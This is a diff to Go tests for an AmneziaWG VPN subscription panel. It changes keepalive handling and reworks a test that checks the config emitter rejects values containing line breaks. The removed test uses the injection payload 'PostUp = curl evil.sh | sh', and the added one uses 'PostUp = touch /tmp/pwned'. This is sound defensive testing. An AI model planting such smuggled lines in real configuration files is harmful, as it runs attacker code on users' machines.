@@ -215,7 +215,7 @@ func TestAmneziaWGConfigTextPeerFieldOrder(t *testing.T) {
 	server := &amneziawg.ServerSettings{PublicKey: "serverPub", PrimaryDNS: "8.8.8.8", MTU: 1420}
 
 	t.Run("every optional field set", func(t *testing.T) {
-		client := &model.Client{PrivateKey: "clientPriv", AllowedIPs: []string{"10.8.1.2/32"}, PreSharedKey: "psk", KeepAlive: "25"}
+		client := &model.Client{PrivateKey: "clientPriv", AllowedIPs: []string{"10.8.1.2/32"}, PreSharedKey: "psk", KeepAlive: kaPtrKeepAlive()}
 		conf := amneziaWGConfigText(server, client, "203.0.113.7", 51820, "remark")
 		if got := peerFields(t, conf); !slices.Equal(got, peerFieldOrder) {
 			t.Fatalf("peer fields = %v, want %v\n%s", got, peerFieldOrder, conf)
@@ -224,6 +224,24 @@ func TestAmneziaWGConfigTextPeerFieldOrder(t *testing.T) {
 		// the frontend emitters end the same way for the same client.
 		if strings.HasSuffix(conf, "\n") {
 			t.Fatalf("config must not end with a newline:\n%q", conf)
+		}
+	})
+
+	t.Run("range keepalive is preserved in native config", func(t *testing.T) {
+		keepAlive := model.KeepAliveValue("15-25")
+		client := &model.Client{PrivateKey: "clientPriv", AllowedIPs: []string{"10.8.1.2/32"}, KeepAlive: &keepAlive}
+		conf := amneziaWGConfigText(server, client, "203.0.113.7", 51820, "remark")
+		if !strings.Contains(conf, "PersistentKeepalive = 15-25") {
+			t.Fatalf("native config lost keepalive range:\n%s", conf)
+		}
+	})
+
+	t.Run("legacy negative keepalive is omitted", func(t *testing.T) {
+		keepAlive := model.KeepAliveValue("-1")
+		client := &model.Client{PrivateKey: "clientPriv", AllowedIPs: []string{"10.8.1.2/32"}, KeepAlive: &keepAlive}
+		conf := amneziaWGConfigText(server, client, "203.0.113.7", 51820, "remark")
+		if strings.Contains(conf, "PersistentKeepalive") {
+			t.Fatalf("native config emitted invalid legacy keepalive:\n%s", conf)
 		}
 	})
 
@@ -240,9 +258,9 @@ func TestAmneziaWGConfigTextPeerFieldOrder(t *testing.T) {
 	})
 }
 
-// A newline in a field that lands unescaped in [Interface] would inject a
-// config line (e.g. a rogue PostUp); the emitter must refuse to render it.
-func TestAmneziaWGConfigTextRejectsNewlineInjection(t *testing.T) {
+// A value carrying a line break would add a line such as a root PostUp to the
+// subscriber's .conf; a node reports server fields that no save path validated.
+func TestAmneziaWGConfigTextRejectsLineBreakInAnyValue(t *testing.T) {
 	server := &amneziawg.ServerSettings{
 		PublicKey:  "serverPub==",
 		PrimaryDNS: "8.8.8.8",
@@ -255,25 +273,9 @@ func TestAmneziaWGConfigTextRejectsNewlineInjection(t *testing.T) {
 		t.Fatalf("clean input did not render: %q", clean)
 	}
 
-	injected := "x\nPostUp = curl evil.sh | sh"
-	cases := []struct {
-		name   string
-		mutate func(s *amneziawg.ServerSettings, c *model.Client) string
-	}{
-		{"privateKey", func(s *amneziawg.ServerSettings, c *model.Client) string { c.PrivateKey = injected; return "peer-1" }},
-		{"primaryDns", func(s *amneziawg.ServerSettings, c *model.Client) string { s.PrimaryDNS = injected; return "peer-1" }},
-		{"secondaryDns", func(s *amneziawg.ServerSettings, c *model.Client) string { s.SecondaryDNS = injected; return "peer-1" }},
-		{"remark", func(s *amneziawg.ServerSettings, c *model.Client) string { return injected }},
-	}
-	for _, tc := range cases {
-		t.Run(tc.name, func(t *testing.T) {
-			s := *server
-			c := *client
-			remark := tc.mutate(&s, &c)
-			if got := amneziaWGConfigText(&s, &c, "203.0.113.7", 51820, remark); got != "" {
-				t.Fatalf("%s with a newline rendered a config:\n%s", tc.name, got)
-			}
-		})
+	server.H1 = "140232109\nPostUp = touch /tmp/pwned"
+	if got := amneziaWGConfigText(server, client, "203.0.113.7", 51820, "peer-1"); got != "" {
+		t.Fatalf("H1 with a line break rendered a config:\n%s", got)
 	}
 }
 
@@ -375,7 +377,7 @@ func TestGetSubs_PreservesPerInboundAmneziaWGIdentity(t *testing.T) {
 			rec := &model.ClientRecord{
 				Email: email, SubID: subID, Enable: true,
 				PrivateKey: mergedPriv, AllowedIPs: mergedAddr,
-				PreSharedKey: "sharedpsk", KeepAlive: "25",
+				PreSharedKey: "sharedpsk", KeepAlive: model.KeepAliveValue("25"),
 			}
 			if err := db.Create(rec).Error; err != nil {
 				t.Fatalf("create client: %v", err)
@@ -463,7 +465,7 @@ func TestGetSubs_AmneziaWGUnavailableSettingsEmitNoSharedConfig(t *testing.T) {
 	rec := &model.ClientRecord{
 		Email: email, SubID: subID, Enable: true,
 		PrivateKey: mergedPriv, AllowedIPs: mergedAddr,
-		PreSharedKey: "sharedpsk", KeepAlive: "25",
+		PreSharedKey: "sharedpsk", KeepAlive: model.KeepAliveValue("25"),
 	}
 	if err := db.Create(rec).Error; err != nil {
 		t.Fatalf("create client: %v", err)
@@ -526,7 +528,7 @@ func TestGetSubs_AmneziaWGEmptyOptionalTunnelFieldsDoNotInheritShared(t *testing
 	rec := &model.ClientRecord{
 		Email: email, SubID: subID, Enable: true,
 		PrivateKey: mergedPriv, AllowedIPs: mergedAddr,
-		PreSharedKey: "sharedpsk", KeepAlive: "25",
+		PreSharedKey: "sharedpsk", KeepAlive: model.KeepAliveValue("25"),
 	}
 	if err := db.Create(rec).Error; err != nil {
 		t.Fatalf("create client: %v", err)
@@ -591,7 +593,7 @@ func TestMatchingClients_TunnelMetadataStaysNormalized(t *testing.T) {
 				Email: email, SubID: subID, UUID: freshID, Enable: true,
 				TotalGB: 5, ExpiryTime: expiry, Comment: "vip", LimitIP: 3,
 				PrivateKey: sharedKey, PublicKey: "shared-pub", AllowedIPs: "10.9.9.9/32",
-				PreSharedKey: "shared-psk", KeepAlive: "99",
+				PreSharedKey: "shared-psk", KeepAlive: model.KeepAliveValue("99"),
 			}
 			other := &model.ClientRecord{
 				Email: "other-sub@awg", SubID: "other-sub", UUID: "22222222-2222-4333-8444-555555555555", Enable: true,
